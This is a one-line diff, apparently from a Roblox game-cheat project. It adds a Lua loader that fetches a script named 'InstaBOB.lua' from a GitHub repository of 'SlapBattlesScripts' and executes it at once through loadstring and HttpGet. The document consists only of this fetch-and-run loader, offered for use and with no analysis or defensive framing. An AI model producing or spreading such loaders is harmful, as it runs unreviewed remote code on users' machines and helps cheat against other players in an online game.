@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Ga5st3r/SlapBattlesScripts/main/InstaBOB.lua")))()
